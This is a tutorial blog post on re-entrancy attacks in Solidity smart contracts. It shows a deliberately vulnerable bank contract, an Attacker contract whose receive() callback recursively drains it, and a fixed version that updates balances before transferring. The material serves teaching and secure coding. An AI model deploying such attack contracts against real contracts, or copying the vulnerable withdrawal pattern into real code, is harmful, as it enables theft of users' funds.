---
layout: post
title: Re-entrancy attacks in Smart Contracts
categories: [smart contracts]
---

I've been playing around with smart contracts recently. In this post I explain a re-entrancy attacks, a common security flaw in many smart contracts Re-entrancy attacks occur when a smart contract function temporarily abandons the transaction's control flow by making an external call to a contract written by unknown or hostile actors. This allows the latter contract to make a recursive call to the primary smart contract function to drain its funds.

The steps in this attack are as follows:

1. The attacker requests the vulnerable Contract **X** to transfer funds to the malicious Contract **Y**.
2. Contract **X** determines if the attacker has the required funds, and then transfers the funds to Contract **Y**.
3. The attacker then executes a callback function. Once Contract **Y** receives the funds, it executes a callback function that calls Contract **X** back before updating the account balance.
4. This recursive process continues until all funds are used up and transferred.

Re-entrancy attacks are best illustrated by an example. Consider this simple Bank contract called **EOABank**:

```solidity
//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.9;

contract EOABank {

    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawAll() public {
        (bool success, ) = msg.sender.call{ value: balances[msg.sender] }("");
        require(success, "Transaction failed!");
        balances[msg.sender] = 0;
    }
}
```

What this contract does is simple. It accepts payments through the `deposit()` function and allows withdrawal of all funds with the `withdrawAll()` function.

## How can this EOABank contract be attacked?

Consider this **Attacker** contract:

```solidity
contract Attacker {

    EOABank public exploitBank;

    constructor(address _thebankAddress) {
        exploitBank = EOABank(_thebankAddress);
    }

    // fallback
    receive() external payable {
        if (address(exploitBank).balance >= 1 ether) {
            exploitBank.withdrawAll();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        // send 1 Ether
        exploitBank.deposit{value: 1 ether}();
        // immediately withdraw
        exploitBank.withdrawAll();
    }

}
```

This contract expects the address of the **EOABank** contract at deployment. It also overwrites the `receive()` function (usually a fallback function in every smart contract) with its own functionality. The `attack()` function is where **EOABank** is attacked.

Let's go through the steps of this attack in more detail:
![](/images/reentrancy.png)

1. The Attacker contract deposits 1 Ether at **EOABank**.
2. The funds are immediately withdrawn.
3. The withdrawal triggers the `receive()` function. This happens before `balances` is set to 0.
4. The `receive()` function allows execution of arbitrary code. The Attacker uses this to call `withdrawAll()` again.
5. Here the loop starts between `receive()` and `withdrawAll()` until all funds are drained.
6. The loop.
7. Only after all funds are drained, `balances` is set to 0.

## What would a safe implementation of EOABank look like?

```solidity
contract EOABank {

    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawAll() public {
        // save balances in new variable
        uint256 bal = balances[msg.sender];
        // reset balances
        balances[msg.sender] = 0;
        // transfer
        (bool success, ) = msg.sender.call{ value: bal }("");
        require(success, "Transaction failed!");
    }
}
```

Notice the difference. First, the `balances` value is saved in a new variable `bal`. Second, the `balances` are set to 0 before transferring the value. In this way, **EOABank** is safe from Re-entrancy attacks.
